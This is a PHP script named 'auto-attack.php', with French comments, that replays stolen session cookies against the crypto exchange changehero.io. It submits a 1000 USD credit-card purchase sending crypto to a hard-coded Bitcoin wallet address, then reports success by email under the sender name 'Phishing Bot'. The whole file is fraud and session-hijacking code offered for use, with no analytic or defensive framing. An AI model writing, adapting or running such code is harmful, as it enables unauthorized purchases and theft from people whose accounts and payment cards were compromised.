<?php
// auto-attack.php

// Charger les variables d'environnement
$env = parse_ini_file('.env', true);

// Charger les cookies depuis le fichier
$cookies = file_get_contents('cookies.txt');

// Utiliser cURL pour se connecter à changehero.io
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://changehero.io/buy-sell-transaction/buy');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIE, $cookies);

$response = curl_exec($ch);

if ($response === false) {
    die('Erreur de connexion : ' . curl_error($ch));
}

// Analyser la réponse pour trouver le formulaire ou les données de transaction
// Si le site utilise des cookies, le script peut effectuer des transactions automatiques

// Exemple : acheter 1000 USD en crypto
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'amount' => '1000',
    'currency' => 'USD',
    'payment_method' => 'credit_card',
    'destination' => 'bc1qu5njfcsr4pygu5ujggry65f98rmcyu9hc6qn6z' // Wasabi wallet address
]));

$transaction_result = curl_exec($ch);

if ($transaction_result === false) {
    die('Erreur lors de la transaction : ' . curl_error($ch));
}

// Envoi d'un e-mail si la transaction est réussie
$mail = new PHPMailer\PHPMailer\PHPMailer();
$mail->isSMTP();
$mail->Host = $env['SMTP_HOST'];
$mail->SMTPAuth = true;
$mail->Username = $env['SMTP_USER'];
$mail->Password = $env['SMTP_PASS'];
$mail->SMTPSecure = $env['SMTP_SECURE'];
$mail->Port = $env['SMTP_PORT'];

$mail->setFrom($env['SMTP_USER'], 'Phishing Bot');
$mail->addAddress('votre_email@example.com', 'Admin');

$mail->isHTML(false);
$mail->Subject = 'Transaction réussie';
$mail->Body = "Transaction réussie sur changehero.io\n\n" . $transaction_result;

if (!$mail->send()) {
    echo "E-mail non envoyé. Erreur : " . $mail->ErrorInfo;
} else {
    echo "Transaction réussie et e-mail envoyé !";
}

curl_close($ch);
?>
